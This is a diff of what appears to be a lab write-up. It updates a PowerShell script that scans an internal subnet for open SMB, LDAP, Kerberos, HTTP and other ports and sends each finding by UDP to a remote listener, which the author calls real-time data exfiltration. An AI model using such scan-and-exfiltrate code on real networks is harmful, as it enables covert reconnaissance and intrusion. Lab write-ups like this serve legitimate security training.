@@ -29,28 +29,30 @@ To efficiently identify open ports across subnet addresses, I crafted a PowerShe
 $ListenerIP = "10.10.15.252"
 $ListenerPort = 5001
 $subnet = "172.16.2"
+$Ports = @(80, 445, 139, 22, 21, 88, 389, 636, 443, 8080, 8000)
 $udpclient = New-Object System.Net.Sockets.UdpClient
 
-100..102 | ForEach-Object { 
+1..254 | ForEach-Object {
     $ip = "$subnet.$_"
-    try {
-        $socket = New-Object System.Net.Sockets.TcpClient
-        $async = $socket.BeginConnect($ip, 445, $null, $null)
-        if ($async.AsyncWaitHandle.WaitOne(1000, $false)) { 
-            $result = "$env:computername - $ip - 445 is open`n"
-        } else {
-            $result = "$env:computername - $ip - 445 is closed`n"
+    Foreach ($p in $Ports) {
+        try {
+            $socket = New-Object System.Net.Sockets.TcpClient
+            $async = $socket.BeginConnect($ip, $p, $null, $null)
+            if ($async.AsyncWaitHandle.WaitOne(1000, $false)) {
+                $result = "$env:computername - $ip - $p is open`n"
+				$udpclient.Send([Text.Encoding]::ASCII.GetBytes($result), $result.Length, $ListenerIP, $ListenerPort)
+            } else {
+                $result = "$env:computername - $ip - $p is closed`n"
+				# $udpclient.Send([Text.Encoding]::ASCII.GetBytes($result), $result.Length, $ListenerIP, $ListenerPort)
+            }
+            $socket.Close()
+        } catch {
+            $result = "$env:computername - $ip - $p encountered an error`n"
+            $udpclient.Send([Text.Encoding]::ASCII.GetBytes($result), $result.Length, $ListenerIP, $ListenerPort)
         }
-        $udpclient.Send([Text.Encoding]::ASCII.GetBytes($result), $result.Length, $ListenerIP, $ListenerPort)
-    } catch {
-        $result = "$env:computername - $ip - encountered an error`n"
-        $udpclient.Send([Text.Encoding]::ASCII.GetBytes($result), $result.Length, $ListenerIP, $ListenerPort)
-    } finally {
-        $socket.Close()
     }
 }
 $udpclient.Close()
-
 ```
 
 ### Socat Command
@@ -93,4 +95,4 @@ SQL01 - 172.16.2.102 - 445 is closed
 ### Conclusion
 While not necessarily OpSec safe, this exercise was a fun and effective way to explore and understand the network layout and security posture regarding SMB ports within the lab's domain. The use of automated scripts and real-time data exfiltration offered a dynamic approach to network exploration.
 
-We can easily adapt the ports to check, or even nest another For loop to add checking for multiple subnets.  I already had an idea of what i was going to find, and was only interested in the existence of the subnet, so i opted for on port and was content with running this multiple times to get what i needed.
+We can easily adapt the ports to check, or even nest another For loop to add checking for multiple subnets.  I already had an idea of what i was going to find, and was only interested in the existence of the subnet, so i opted for only port **(Updated the script since)** and was content with running this multiple times to get what i needed.
